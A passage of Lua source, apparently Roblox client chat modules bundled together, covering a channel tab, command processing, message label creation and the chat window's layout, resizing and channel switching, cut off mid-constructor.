			self.AnimParams.Text_NormalizedExptValue = CurveUtil:NormalizedDefaultExptValueInSeconds(0)
		
			self.AnimParams.TextStroke_TargetTransparency = 0.75
			self.AnimParams.TextStroke_CurrentTransparency = 0.75
			self.AnimParams.TextStroke_NormalizedExptValue = CurveUtil:NormalizedDefaultExptValueInSeconds(0)
		
			self.AnimParams.Background_TargetTransparency = 0.6
			self.AnimParams.Background_CurrentTransparency = 0.6
			self.AnimParams.Background_NormalizedExptValue = CurveUtil:NormalizedDefaultExptValueInSeconds(0)
		end
		
		function methods:Update(dtScale)
			self.AnimParams.Background_CurrentTransparency = CurveUtil:Expt(
					self.AnimParams.Background_CurrentTransparency,
					self.AnimParams.Background_TargetTransparency,
					self.AnimParams.Background_NormalizedExptValue,
					dtScale
			)
			self.AnimParams.Text_CurrentTransparency = CurveUtil:Expt(
					self.AnimParams.Text_CurrentTransparency,
					self.AnimParams.Text_TargetTransparency,
					self.AnimParams.Text_NormalizedExptValue,
					dtScale
			)
			self.AnimParams.TextStroke_CurrentTransparency = CurveUtil:Expt(
					self.AnimParams.TextStroke_CurrentTransparency,
					self.AnimParams.TextStroke_TargetTransparency,
					self.AnimParams.TextStroke_NormalizedExptValue,
					dtScale
			)
		
			self:AnimGuiObjects()
		end
		
		--///////////////////////// Constructors
		--//////////////////////////////////////
		
		function module.new(channelName)
			local obj = setmetatable({}, methods)
		
			local BaseFrame, NameTag, NameTagNonSelect, NameTagSelect, NewMessageIcon, UnselectedFrame, SelectedFrame = CreateGuiObjects()
			obj.GuiObject = BaseFrame
			obj.NameTag = NameTag
			obj.NameTagNonSelect = NameTagNonSelect
			obj.NameTagSelect = NameTagSelect
			obj.NewMessageIcon = NewMessageIcon
			obj.UnselectedFrame = UnselectedFrame
			obj.SelectedFrame = SelectedFrame
		
			obj.BlueBarLeft = SelectedFrame.BlueBarLeft
			obj.BlueBarRight = SelectedFrame.BlueBarRight
			obj.BackgroundImage = SelectedFrame.BackgroundImage
			obj.WhiteTextNewMessageNotification = obj.NewMessageIcon.TextLabel
		
			obj.ChannelName = channelName
			obj.UnreadMessageCount = 0
			obj.Active = false
		
			obj.GuiObject.Name = "Frame_" .. obj.ChannelName
		
			if (string.len(channelName) > ChatSettings.MaxChannelNameLength) then
				channelName = string.sub(channelName, 1, ChatSettings.MaxChannelNameLength - 3) .. "..."
			end
		
			--obj.NameTag.Text = channelName
		
			obj.NameTag.Text = ""
			obj.NameTagNonSelect.Text = channelName
			obj.NameTagSelect.Text = channelName
		
			obj.AnimParams = {}
		
			obj:InitializeAnimParams()
			obj:AnimGuiObjects()
			obj:SetActive(false)
		
			return obj
		end
		
		return module
		
	end[command_processor] = function()
		--	// FileName: ProcessCommands.lua
		--	// Written by: TheGamer101
		--	// Description: Module for processing commands using the client CommandModules
		
		local module = {}
		local methods = {}
		methods.__index = methods
		
		--////////////////////////////// Include
		--//////////////////////////////////////
		local Chat = game:GetService("Chat")
		local clientChatModules = Chat:WaitForChild("ClientChatModules")
		local commandModules = clientChatModules:WaitForChild("CommandModules")
		local commandUtil = require(commandModules:WaitForChild("Util"))
		local modulesFolder = script.Parent
		local ChatSettings = require(clientChatModules:WaitForChild("ChatSettings"))
		
		function methods:SetupCommandProcessors()
			local commands = commandModules:GetChildren()
			for i = 1, #commands do
				if commands[i]:IsA("ModuleScript") then
					if commands[i].Name ~= "Util" then
						local commandProcessor = require(commands[i])
						local processorType = commandProcessor[commandUtil.KEY_COMMAND_PROCESSOR_TYPE]
						local processorFunction = commandProcessor[commandUtil.KEY_PROCESSOR_FUNCTION]
						if processorType == commandUtil.IN_PROGRESS_MESSAGE_PROCESSOR then
							table.insert(self.InProgressMessageProcessors, processorFunction)
						elseif processorType == commandUtil.COMPLETED_MESSAGE_PROCESSOR then
							table.insert(self.CompletedMessageProcessors, processorFunction)
						end
					end
				end
			end
		end
		
		function methods:ProcessCompletedChatMessage(message, ChatWindow)
			for i = 1, #self.CompletedMessageProcessors do
				local processedCommand = self.CompletedMessageProcessors[i](message, ChatWindow, ChatSettings)
				if processedCommand then
					return true
				end
			end
			return false
		end
		
		function methods:ProcessInProgressChatMessage(message, ChatWindow, ChatBar)
			for i = 1, #self.InProgressMessageProcessors do
				local customState = self.InProgressMessageProcessors[i](message, ChatWindow, ChatBar, ChatSettings)
				if customState then
					return customState
				end
			end
			return nil
		end
		
		--///////////////////////// Constructors
		--//////////////////////////////////////
		
		function module.new()
			local obj = setmetatable({}, methods)
		
			obj.CompletedMessageProcessors = {}
			obj.InProgressMessageProcessors = {}
		
			obj:SetupCommandProcessors()
		
			return obj
		end
		
		return module
		
	end[message_label_creator] = function()
		--	// FileName: MessageLabelCreator.lua
		--	// Written by: Xsitsu
		--	// Description: Module to handle taking text and creating stylized GUI objects for display in ChatWindow.
		
		local OBJECT_POOL_SIZE = 50
		
		local module = {}
		--////////////////////////////// Include
		--//////////////////////////////////////
		local Chat = game:GetService("Chat")
		local clientChatModules = Chat:WaitForChild("ClientChatModules")
		local messageCreatorModules = clientChatModules:WaitForChild("MessageCreatorModules")
		local messageCreatorUtil = require(messageCreatorModules:WaitForChild("Util"))
		local modulesFolder = script.Parent
		local ChatSettings = require(clientChatModules:WaitForChild("ChatSettings"))
		local moduleObjectPool = require(modulesFolder:WaitForChild("ObjectPool"))
		local MessageSender = require(modulesFolder:WaitForChild("MessageSender"))
		
		--////////////////////////////// Methods
		--//////////////////////////////////////
		local methods = {}
		methods.__index = methods
		
		-- merge properties on both table to target
		function mergeProps(source, target)
			if not source then return end
			for prop, value in pairs(source) do
				target[prop] = value
			end
		end
		
		function ReturnToObjectPoolRecursive(instance, objectPool)
			local children = instance:GetChildren()
			for i = 1, #children do
				ReturnToObjectPoolRecursive(children[i], objectPool)
			end
			instance.Parent = nil
			objectPool:ReturnInstance(instance)
		end
		
		function GetMessageCreators()
			local typeToFunction = {}
			local creators = messageCreatorModules:GetChildren()
			for i = 1, #creators do
				if creators[i]:IsA("ModuleScript") then
					if creators[i].Name ~= "Util" then
						local creator = require(creators[i])
						typeToFunction[creator[messageCreatorUtil.KEY_MESSAGE_TYPE]] = creator[messageCreatorUtil.KEY_CREATOR_FUNCTION]
					end
				end
			end
			return typeToFunction
		end
		
		function methods:WrapIntoMessageObject(messageData, createdMessageObject)
			local BaseFrame = createdMessageObject[messageCreatorUtil.KEY_BASE_FRAME]
			local BaseMessage = nil
			if messageCreatorUtil.KEY_BASE_MESSAGE then
				BaseMessage = createdMessageObject[messageCreatorUtil.KEY_BASE_MESSAGE]
			end
			local UpdateTextFunction = createdMessageObject[messageCreatorUtil.KEY_UPDATE_TEXT_FUNC]
			local GetHeightFunction = createdMessageObject[messageCreatorUtil.KEY_GET_HEIGHT]
			local FadeInFunction = createdMessageObject[messageCreatorUtil.KEY_FADE_IN]
			local FadeOutFunction = createdMessageObject[messageCreatorUtil.KEY_FADE_OUT]
			local UpdateAnimFunction = createdMessageObject[messageCreatorUtil.KEY_UPDATE_ANIMATION]
		
			local obj = {}
		
			obj.ID = messageData.ID
			obj.BaseFrame = BaseFrame
			obj.BaseMessage = BaseMessage
			obj.UpdateTextFunction = UpdateTextFunction or function() warn("NO MESSAGE RESIZE FUNCTION") end
			obj.GetHeightFunction = GetHeightFunction
			obj.FadeInFunction = FadeInFunction
			obj.FadeOutFunction = FadeOutFunction
			obj.UpdateAnimFunction = UpdateAnimFunction
			obj.ObjectPool = self.ObjectPool
			obj.Destroyed = false
		
			function obj:Destroy()
				ReturnToObjectPoolRecursive(self.BaseFrame, self.ObjectPool)
				self.Destroyed = true
			end
		
			return obj
		end
		
		function methods:CreateMessageLabel(messageData, currentChannelName)
		
			messageData.Channel = currentChannelName
			local extraDeveloperFormatTable
			pcall(function()
				extraDeveloperFormatTable = Chat:InvokeChatCallback(Enum.ChatCallbackType.OnClientFormattingMessage, messageData)
			end)
			messageData.ExtraData = messageData.ExtraData or {}
			mergeProps(extraDeveloperFormatTable, messageData.ExtraData)
		
			local messageType = messageData.MessageType
			if self.MessageCreators[messageType] then
				local createdMessageObject = self.MessageCreators[messageType](messageData, currentChannelName)
				if createdMessageObject then
					return self:WrapIntoMessageObject(messageData, createdMessageObject)
				end
			elseif self.DefaultCreatorType then
				local createdMessageObject = self.MessageCreators[self.DefaultCreatorType](messageData, currentChannelName)
				if createdMessageObject then
					return self:WrapIntoMessageObject(messageData, createdMessageObject)
				end
			else
				error("No message creator available for message type: " ..messageType)
			end
		end
		
		--///////////////////////// Constructors
		--//////////////////////////////////////
		
		function module.new()
			local obj = setmetatable({}, methods)
		
			obj.ObjectPool = moduleObjectPool.new(OBJECT_POOL_SIZE)
			obj.MessageCreators = GetMessageCreators()
			obj.DefaultCreatorType = messageCreatorUtil.DEFAULT_MESSAGE_CREATOR
		
			messageCreatorUtil:RegisterObjectPool(obj.ObjectPool)
		
			return obj
		end
		
		function module:GetStringTextBounds(text, font, textSize, sizeBounds)
			return messageCreatorUtil:GetStringTextBounds(text, font, textSize, sizeBounds)
		end
		
		return module
		
	end[chat_window] = function()
		--	// FileName: ChatWindow.lua
		--	// Written by: Xsitsu
		--	// Description: Main GUI window piece. Manages ChatBar, ChannelsBar, and ChatChannels.
		
		local FFlagFixMouseCapture = false do
			local ok, value = pcall(function()
				return UserSettings():IsUserFeatureEnabled("UserFixMouseCapture")
			end)
			if ok then
				FFlagFixMouseCapture = value
			end
		end
		
		local module = {}
		
		local Players = game:GetService("Players")
		local Chat = game:GetService("Chat")
		local LocalPlayer = Players.LocalPlayer
		local PlayerGui = LocalPlayer:WaitForChild("PlayerGui")
		
		local PHONE_SCREEN_WIDTH = 640
		local TABLET_SCREEN_WIDTH = 1024
		
		local DEVICE_PHONE = 1
		local DEVICE_TABLET = 2
		local DEVICE_DESKTOP = 3
		
		--////////////////////////////// Include
		--//////////////////////////////////////
		local Chat = game:GetService("Chat")
		local clientChatModules = Chat:WaitForChild("ClientChatModules")
		local modulesFolder = script.Parent
		local moduleChatChannel = require(modulesFolder:WaitForChild("ChatChannel"))
		local ChatSettings = require(clientChatModules:WaitForChild("ChatSettings"))
		local CurveUtil = require(modulesFolder:WaitForChild("CurveUtil"))
		
		--////////////////////////////// Methods
		--//////////////////////////////////////
		local methods = {}
		methods.__index = methods
		
		function getClassicChatEnabled()
			if ChatSettings.ClassicChatEnabled ~= nil then
				return ChatSettings.ClassicChatEnabled
			end
			return Players.ClassicChat
		end
		
		function getBubbleChatEnabled()
			if ChatSettings.BubbleChatEnabled ~= nil then
				return ChatSettings.BubbleChatEnabled
			end
			return Players.BubbleChat
		end
		
		function bubbleChatOnly()
		 	return not getClassicChatEnabled() and getBubbleChatEnabled()
		end
		
		-- only merge property defined on target
		function mergeProps(source, target)
			if not source or not target then return end
			for prop, value in pairs(source) do
				if target[prop] ~= nil then
					target[prop] = value
				end
			end
		end
		
		function methods:CreateGuiObjects(targetParent)
			local userDefinedChatWindowStyle 
			pcall(function()
				userDefinedChatWindowStyle= Chat:InvokeChatCallback(Enum.ChatCallbackType.OnCreatingChatWindow, nil)
			end)
		
			-- merge the userdefined settings with the ChatSettings
			mergeProps(userDefinedChatWindowStyle, ChatSettings)
		
			local BaseFrame = Instance.new("Frame")
			BaseFrame.BackgroundTransparency = 1
			BaseFrame.Active = ChatSettings.WindowDraggable
			BaseFrame.Parent = targetParent
		    BaseFrame.AutoLocalize = false
		
			local ChatBarParentFrame = Instance.new("Frame")
			ChatBarParentFrame.Selectable = false
			ChatBarParentFrame.Name = "ChatBarParentFrame"
			ChatBarParentFrame.BackgroundTransparency = 1
			ChatBarParentFrame.Parent = BaseFrame
		
			local ChannelsBarParentFrame = Instance.new("Frame")
			ChannelsBarParentFrame.Selectable = false
			ChannelsBarParentFrame.Name = "ChannelsBarParentFrame"
			ChannelsBarParentFrame.BackgroundTransparency = 1
			ChannelsBarParentFrame.Position = UDim2.new(0, 0, 0, 0)
			ChannelsBarParentFrame.Parent = BaseFrame
		
			local ChatChannelParentFrame = Instance.new("Frame")
			ChatChannelParentFrame.Selectable = false
			ChatChannelParentFrame.Name = "ChatChannelParentFrame"
			ChatChannelParentFrame.BackgroundTransparency = 1
			ChatChannelParentFrame.BackgroundColor3 = ChatSettings.BackGroundColor
			ChatChannelParentFrame.BackgroundTransparency = 0.6
			ChatChannelParentFrame.BorderSizePixel = 0
			ChatChannelParentFrame.Parent = BaseFrame
		
			local ChatResizerFrame = Instance.new("ImageButton")
			ChatResizerFrame.Selectable = false
			ChatResizerFrame.Image = ""
			ChatResizerFrame.BackgroundTransparency = 0.6
			ChatResizerFrame.BorderSizePixel = 0
			ChatResizerFrame.Visible = false
			ChatResizerFrame.BackgroundColor3 = ChatSettings.BackGroundColor
			ChatResizerFrame.Active = true
			if bubbleChatOnly() then
				ChatResizerFrame.Position = UDim2.new(1, -ChatResizerFrame.AbsoluteSize.X, 0, 0)
			else
				ChatResizerFrame.Position = UDim2.new(1, -ChatResizerFrame.AbsoluteSize.X, 1, -ChatResizerFrame.AbsoluteSize.Y)
			end
			ChatResizerFrame.Parent = BaseFrame
		
			local ResizeIcon = Instance.new("ImageLabel")
			ResizeIcon.Selectable = false
			ResizeIcon.Size = UDim2.new(0.8, 0, 0.8, 0)
			ResizeIcon.Position = UDim2.new(0.2, 0, 0.2, 0)
			ResizeIcon.BackgroundTransparency = 1
			ResizeIcon.Image = "rbxassetid://261880743"
			ResizeIcon.Parent = ChatResizerFrame
		
			local function GetScreenGuiParent()
				--// Travel up parent list until you find the ScreenGui that the chat window is parented to
				local screenGuiParent = BaseFrame
				while (screenGuiParent and not screenGuiParent:IsA("ScreenGui")) do
					screenGuiParent = screenGuiParent.Parent
				end
		
				return screenGuiParent
			end
		
		
			local deviceType = DEVICE_DESKTOP
		
			local screenGuiParent = GetScreenGuiParent()
			if (screenGuiParent.AbsoluteSize.X <= PHONE_SCREEN_WIDTH) then
				deviceType = DEVICE_PHONE
		
			elseif (screenGuiParent.AbsoluteSize.X <= TABLET_SCREEN_WIDTH) then
				deviceType = DEVICE_TABLET
		
			end
		
			local checkSizeLock = false
			local function doCheckSizeBounds()
				if (checkSizeLock) then return end
				checkSizeLock = true
		
				if (not BaseFrame:IsDescendantOf(PlayerGui)) then return end
		
				local screenGuiParent = GetScreenGuiParent()
		
				local minWinSize = ChatSettings.MinimumWindowSize
				local maxWinSize = ChatSettings.MaximumWindowSize
		
				local forceMinY = ChannelsBarParentFrame.AbsoluteSize.Y + ChatBarParentFrame.AbsoluteSize.Y
		
				local minSizePixelX = (minWinSize.X.Scale * screenGuiParent.AbsoluteSize.X) + minWinSize.X.Offset
				local minSizePixelY = math.max((minWinSize.Y.Scale * screenGuiParent.AbsoluteSize.Y) + minWinSize.Y.Offset, forceMinY)
		
				local maxSizePixelX = (maxWinSize.X.Scale * screenGuiParent.AbsoluteSize.X) + maxWinSize.X.Offset
				local maxSizePixelY = (maxWinSize.Y.Scale * screenGuiParent.AbsoluteSize.Y) + maxWinSize.Y.Offset
		
				local absSizeX = BaseFrame.AbsoluteSize.X
				local absSizeY = BaseFrame.AbsoluteSize.Y
		
				if (absSizeX < minSizePixelX) then
					local offset = UDim2.new(0, minSizePixelX - absSizeX, 0, 0)
					BaseFrame.Size = BaseFrame.Size + offset
		
				elseif (absSizeX > maxSizePixelX) then
					local offset = UDim2.new(0, maxSizePixelX - absSizeX, 0, 0)
					BaseFrame.Size = BaseFrame.Size + offset
		
				end
		
				if (absSizeY < minSizePixelY) then
					local offset = UDim2.new(0, 0, 0, minSizePixelY - absSizeY)
					BaseFrame.Size = BaseFrame.Size + offset
		
				elseif (absSizeY > maxSizePixelY) then
					local offset = UDim2.new(0, 0, 0, maxSizePixelY - absSizeY)
					BaseFrame.Size = BaseFrame.Size + offset
		
				end
		
				local xScale = BaseFrame.AbsoluteSize.X / screenGuiParent.AbsoluteSize.X
				local yScale = BaseFrame.AbsoluteSize.Y / screenGuiParent.AbsoluteSize.Y
				
				-- cap chat window scale at a value smaller than 0.5 to prevent center of screen overlap
				if FFlagFixMouseCapture then 
					xScale = math.min(xScale, 0.45)
					yScale = math.min(xScale, 0.45)
				end
				
				BaseFrame.Size = UDim2.new(xScale, 0, yScale, 0)
		
				checkSizeLock = false
			end
		
		
			BaseFrame.Changed:connect(function(prop)
				if (prop == "AbsoluteSize") then
					doCheckSizeBounds()
				end
			end)
		
		
		
			ChatResizerFrame.DragBegin:connect(function(startUdim)
				BaseFrame.Draggable = false
			end)
		
			local function UpdatePositionFromDrag(atPos)
				if ChatSettings.WindowDraggable == false and ChatSettings.WindowResizable == false then
					return
				end
				local newSize = atPos - BaseFrame.AbsolutePosition + ChatResizerFrame.AbsoluteSize
				BaseFrame.Size = UDim2.new(0, newSize.X, 0, newSize.Y)
				if bubbleChatOnly() then
					ChatResizerFrame.Position = UDim2.new(1, -ChatResizerFrame.AbsoluteSize.X, 0, 0)
				else
					ChatResizerFrame.Position = UDim2.new(1, -ChatResizerFrame.AbsoluteSize.X, 1, -ChatResizerFrame.AbsoluteSize.Y)
				end
			end
		
			ChatResizerFrame.DragStopped:connect(function(endX, endY)
				BaseFrame.Draggable = ChatSettings.WindowDraggable
				--UpdatePositionFromDrag(Vector2.new(endX, endY))
			end)
		
			local resizeLock = false
			ChatResizerFrame.Changed:connect(function(prop)
				if (prop == "AbsolutePosition" and not BaseFrame.Draggable) then
					if (resizeLock) then return end
					resizeLock = true
		
					UpdatePositionFromDrag(ChatResizerFrame.AbsolutePosition)
		
					resizeLock = false
				end
			end)
		
			local function CalculateChannelsBarPixelSize(textSize)
				if (deviceType == DEVICE_PHONE) then
					textSize = textSize or ChatSettings.ChatChannelsTabTextSizePhone
				else
					textSize = textSize or ChatSettings.ChatChannelsTabTextSize
				end
		
				local channelsBarTextYSize = textSize
				local chatChannelYSize = math.max(32, channelsBarTextYSize + 8) + 2
		
				return chatChannelYSize
			end
		
			local function CalculateChatBarPixelSize(textSize)
				if (deviceType == DEVICE_PHONE) then
					textSize = textSize or ChatSettings.ChatBarTextSizePhone
				else
					textSize = textSize or ChatSettings.ChatBarTextSize
				end
		
				local chatBarTextSizeY = textSize
				local chatBarYSize = chatBarTextSizeY + (7 * 2) + (5 * 2)
		
				return chatBarYSize
			end
		
			if bubbleChatOnly() then
				ChatBarParentFrame.Position = UDim2.new(0, 0, 0, 0)
				ChannelsBarParentFrame.Visible = false
				ChannelsBarParentFrame.Active = false
				ChatChannelParentFrame.Visible = false
				ChatChannelParentFrame.Active = false
		
				local useXScale = 0
				local useXOffset = 0
		
				local screenGuiParent = GetScreenGuiParent()
		
				if (deviceType == DEVICE_PHONE) then
					useXScale = ChatSettings.DefaultWindowSizePhone.X.Scale
					useXOffset = ChatSettings.DefaultWindowSizePhone.X.Offset
		
				elseif (deviceType == DEVICE_TABLET) then
					useXScale = ChatSettings.DefaultWindowSizeTablet.X.Scale
					useXOffset = ChatSettings.DefaultWindowSizeTablet.X.Offset
		
				else
					useXScale = ChatSettings.DefaultWindowSizeDesktop.X.Scale
					useXOffset = ChatSettings.DefaultWindowSizeDesktop.X.Offset
		
				end
		
				local chatBarYSize = CalculateChatBarPixelSize()
		
				BaseFrame.Size = UDim2.new(useXScale, useXOffset, 0, chatBarYSize)
				BaseFrame.Position = ChatSettings.DefaultWindowPosition
		
			else
		
				local screenGuiParent = GetScreenGuiParent()
		
				if (deviceType == DEVICE_PHONE) then
					BaseFrame.Size = ChatSettings.DefaultWindowSizePhone
		
				elseif (deviceType == DEVICE_TABLET) then
					BaseFrame.Size = ChatSettings.DefaultWindowSizeTablet
		
				else
					BaseFrame.Size = ChatSettings.DefaultWindowSizeDesktop
		
				end
		
				BaseFrame.Position = ChatSettings.DefaultWindowPosition
		
			end
		
			if (deviceType == DEVICE_PHONE) then
				ChatSettings.ChatWindowTextSize = ChatSettings.ChatWindowTextSizePhone
				ChatSettings.ChatChannelsTabTextSize = ChatSettings.ChatChannelsTabTextSizePhone
				ChatSettings.ChatBarTextSize = ChatSettings.ChatBarTextSizePhone
			end
		
			local function UpdateDraggable(enabled)
				BaseFrame.Active = enabled
				BaseFrame.Draggable = enabled
			end
		
			local function UpdateResizable(enabled)
				ChatResizerFrame.Visible = enabled
				ChatResizerFrame.Draggable = enabled
		
				local frameSizeY = ChatBarParentFrame.Size.Y.Offset
		
				if (enabled) then
					ChatBarParentFrame.Size = UDim2.new(1, -frameSizeY - 2, 0, frameSizeY)
					if not bubbleChatOnly() then
						ChatBarParentFrame.Position = UDim2.new(0, 0, 1, -frameSizeY)
					end
				else
					ChatBarParentFrame.Size = UDim2.new(1, 0, 0, frameSizeY)
					if not bubbleChatOnly() then
						ChatBarParentFrame.Position = UDim2.new(0, 0, 1, -frameSizeY)
					end
				end
			end
		
			local function UpdateChatChannelParentFrameSize()
				local channelsBarSize = CalculateChannelsBarPixelSize()
				local chatBarSize = CalculateChatBarPixelSize()
		
				if (ChatSettings.ShowChannelsBar) then
					ChatChannelParentFrame.Size = UDim2.new(1, 0, 1, -(channelsBarSize + chatBarSize + 2 + 2))
					ChatChannelParentFrame.Position = UDim2.new(0, 0, 0, channelsBarSize + 2)
		
				else
					ChatChannelParentFrame.Size = UDim2.new(1, 0, 1, -(chatBarSize + 2 + 2))
					ChatChannelParentFrame.Position = UDim2.new(0, 0, 0, 2)
		
				end
			end
		
			local function UpdateChatChannelsTabTextSize(size)
				local channelsBarSize = CalculateChannelsBarPixelSize(size)
				ChannelsBarParentFrame.Size = UDim2.new(1, 0, 0, channelsBarSize)
		
				UpdateChatChannelParentFrameSize()
			end
		
			local function UpdateChatBarTextSize(size)
				local chatBarSize = CalculateChatBarPixelSize(size)
		
				ChatBarParentFrame.Size = UDim2.new(1, 0, 0, chatBarSize)
				if not bubbleChatOnly() then
					ChatBarParentFrame.Position = UDim2.new(0, 0, 1, -chatBarSize)
				end
		
				ChatResizerFrame.Size = UDim2.new(0, chatBarSize, 0, chatBarSize)
				ChatResizerFrame.Position = UDim2.new(1, -chatBarSize, 1, -chatBarSize)
		
				UpdateChatChannelParentFrameSize()
				UpdateResizable(ChatSettings.WindowResizable)
			end
		
			local function UpdateShowChannelsBar(enabled)
				ChannelsBarParentFrame.Visible = enabled
				UpdateChatChannelParentFrameSize()
			end
		
			UpdateChatChannelsTabTextSize(ChatSettings.ChatChannelsTabTextSize)
			UpdateChatBarTextSize(ChatSettings.ChatBarTextSize)
			UpdateDraggable(ChatSettings.WindowDraggable)
			UpdateResizable(ChatSettings.WindowResizable)
			UpdateShowChannelsBar(ChatSettings.ShowChannelsBar)
		
			ChatSettings.SettingsChanged:connect(function(setting, value)
				if (setting == "WindowDraggable") then
					UpdateDraggable(value)
		
				elseif (setting == "WindowResizable") then
					UpdateResizable(value)
		
				elseif (setting == "ChatChannelsTabTextSize") then
					UpdateChatChannelsTabTextSize(value)
		
				elseif (setting == "ChatBarTextSize") then
					UpdateChatBarTextSize(value)
		
				elseif (setting == "ShowChannelsBar") then
					UpdateShowChannelsBar(value)
		
				end
			end)
		
			self.GuiObject = BaseFrame
		
			self.GuiObjects.BaseFrame = BaseFrame
			self.GuiObjects.ChatBarParentFrame = ChatBarParentFrame
			self.GuiObjects.ChannelsBarParentFrame = ChannelsBarParentFrame
			self.GuiObjects.ChatChannelParentFrame = ChatChannelParentFrame
			self.GuiObjects.ChatResizerFrame = ChatResizerFrame
			self.GuiObjects.ResizeIcon = ResizeIcon
			self:AnimGuiObjects()
		end
		
		function methods:GetChatBar()
			return self.ChatBar
		end
		
		function methods:RegisterChatBar(ChatBar)
			self.ChatBar = ChatBar
			self.ChatBar:CreateGuiObjects(self.GuiObjects.ChatBarParentFrame)
		end
		
		function methods:RegisterChannelsBar(ChannelsBar)
			self.ChannelsBar = ChannelsBar
			self.ChannelsBar:CreateGuiObjects(self.GuiObjects.ChannelsBarParentFrame)
		end
		
		function methods:RegisterMessageLogDisplay(MessageLogDisplay)
			self.MessageLogDisplay = MessageLogDisplay
			self.MessageLogDisplay.GuiObject.Parent = self.GuiObjects.ChatChannelParentFrame
		end
		
		function methods:AddChannel(channelName)
			if (self:GetChannel(channelName)) then
				error("Channel '" .. channelName .. "' already exists!")
				return
			end
		
			local channel = moduleChatChannel.new(channelName, self.MessageLogDisplay)
			self.Channels[channelName:lower()] = channel
		
			channel:SetActive(false)
		
			local tab = self.ChannelsBar:AddChannelTab(channelName)
			tab.NameTag.MouseButton1Click:connect(function()
				self:SwitchCurrentChannel(channelName)
			end)
		
			channel:RegisterChannelTab(tab)
		
			return channel
		end
		
		function methods:GetFirstChannel()
			--// Channels are not indexed numerically, so this function is necessary.
			--// Grabs and returns the first channel it happens to, or nil if none exist.
			for i, v in pairs(self.Channels) do
				return v
			end
			return nil
		end
		
		function methods:RemoveChannel(channelName)
			if (not self:GetChannel(channelName)) then
				error("Channel '" .. channelName .. "' does not exist!")
			end
		
			local indexName = channelName:lower()
		
			local needsChannelSwitch = false
			if (self.Channels[indexName] == self:GetCurrentChannel()) then
				needsChannelSwitch = true
		
				self:SwitchCurrentChannel(nil)
			end
		
			self.Channels[indexName]:Destroy()
			self.Channels[indexName] = nil
		
			self.ChannelsBar:RemoveChannelTab(channelName)
		
			if (needsChannelSwitch) then
				local generalChannelExists = (self:GetChannel(ChatSettings.GeneralChannelName) ~= nil)
				local removingGeneralChannel = (indexName == ChatSettings.GeneralChannelName:lower())
		
				local targetSwitchChannel = nil
		
				if (generalChannelExists and not removingGeneralChannel) then
					targetSwitchChannel = ChatSettings.GeneralChannelName
				else
					local firstChannel = self:GetFirstChannel()
					targetSwitchChannel = (firstChannel and firstChannel.Name or nil)
				end
		
				self:SwitchCurrentChannel(targetSwitchChannel)
			end
		
			if not ChatSettings.ShowChannelsBar then
				if self.ChatBar.TargetChannel == channelName then
					self.ChatBar:SetChannelTarget(ChatSettings.GeneralChannelName)
				end
			end
		end
		
		function methods:GetChannel(channelName)
			return channelName and self.Channels[channelName:lower()] or nil
		end
		
		function methods:GetTargetMessageChannel()
			if (not ChatSettings.ShowChannelsBar) then
				return self.ChatBar.TargetChannel
			else
				local curChannel = self:GetCurrentChannel()
				return curChannel and curChannel.Name
			end
		end
		
		function methods:GetCurrentChannel()
			return self.CurrentChannel
		end
		
		function methods:SwitchCurrentChannel(channelName)
			if (not ChatSettings.ShowChannelsBar) then
				local targ = self:GetChannel(channelName)
				if (targ) then
					self.ChatBar:SetChannelTarget(targ.Name)
				end
		
				channelName = ChatSettings.GeneralChannelName
			end
		
			local cur = self:GetCurrentChannel()
			local new = self:GetChannel(channelName)
			if new == nil then
				error(string.format("Channel '%s' does not exist.", channelName))
			end
		
			if (new ~= cur) then
				if (cur) then
					cur:SetActive(false)
					local tab = self.ChannelsBar:GetChannelTab(cur.Name)
					tab:SetActive(false)
				end
		
				if (new) then
					new:SetActive(true)
					local tab = self.ChannelsBar:GetChannelTab(new.Name)
					tab:SetActive(true)
				end
		
				self.CurrentChannel = new
			end
		
		end
		
		function methods:UpdateFrameVisibility()
			self.GuiObject.Visible = (self.Visible and self.CoreGuiEnabled)
		end
		
		function methods:GetVisible()
			return self.Visible
		end
		
		function methods:SetVisible(visible)
			self.Visible = visible
			self:UpdateFrameVisibility()
		end
		
		function methods:GetCoreGuiEnabled()
			return self.CoreGuiEnabled
		end
		
		function methods:SetCoreGuiEnabled(enabled)
			self.CoreGuiEnabled = enabled
			self:UpdateFrameVisibility()
		end
		
		function methods:EnableResizable()
			self.GuiObjects.ChatResizerFrame.Active = true
		end
		
		function methods:DisableResizable()
			self.GuiObjects.ChatResizerFrame.Active = false
		end
		
		function methods:FadeOutBackground(duration)
			self.ChannelsBar:FadeOutBackground(duration)
			self.MessageLogDisplay:FadeOutBackground(duration)
			self.ChatBar:FadeOutBackground(duration)
		
			self.AnimParams.Background_TargetTransparency = 1
			self.AnimParams.Background_NormalizedExptValue = CurveUtil:NormalizedDefaultExptValueInSeconds(duration)
		end
		
		function methods:FadeInBackground(duration)
			self.ChannelsBar:FadeInBackground(duration)
			self.MessageLogDisplay:FadeInBackground(duration)
			self.ChatBar:FadeInBackground(duration)
		
			self.AnimParams.Background_TargetTransparency = 0.6
			self.AnimParams.Background_NormalizedExptValue = CurveUtil:NormalizedDefaultExptValueInSeconds(duration)
		end
		
		function methods:FadeOutText(duration)
			self.MessageLogDisplay:FadeOutText(duration)
			self.ChannelsBar:FadeOutText(duration)
		end
		
		function methods:FadeInText(duration)
			self.MessageLogDisplay:FadeInText(duration)
			self.ChannelsBar:FadeInText(duration)
		end
		
		function methods:AnimGuiObjects()
			self.GuiObjects.ChatChannelParentFrame.BackgroundTransparency = self.AnimParams.Background_CurrentTransparency
			self.GuiObjects.ChatResizerFrame.BackgroundTransparency = self.AnimParams.Background_CurrentTransparency
			self.GuiObjects.ResizeIcon.ImageTransparency = self.AnimParams.Background_CurrentTransparency
		end
		
		function methods:InitializeAnimParams()
			self.AnimParams.Background_TargetTransparency = 0.6
			self.AnimParams.Background_CurrentTransparency = 0.6
			self.AnimParams.Background_NormalizedExptValue = CurveUtil:NormalizedDefaultExptValueInSeconds(0)
		end
		
		function methods:Update(dtScale)
			self.ChatBar:Update(dtScale)
			self.ChannelsBar:Update(dtScale)
			self.MessageLogDisplay:Update(dtScale)
		
			self.AnimParams.Background_CurrentTransparency = CurveUtil:Expt(
					self.AnimParams.Background_CurrentTransparency,
					self.AnimParams.Background_TargetTransparency,
					self.AnimParams.Background_NormalizedExptValue,
					dtScale
			)
		
			self:AnimGuiObjects()
		end
		
		--///////////////////////// Constructors
		--//////////////////////////////////////
		
		function module.new()
			local obj = setmetatable({}, methods)
		
			obj.GuiObject = nil
			obj.GuiObjects = {}
		
			obj.ChatBar = nil
			obj.ChannelsBar = nil
			obj.MessageLogDisplay = nil
		
			obj.Channels = {}
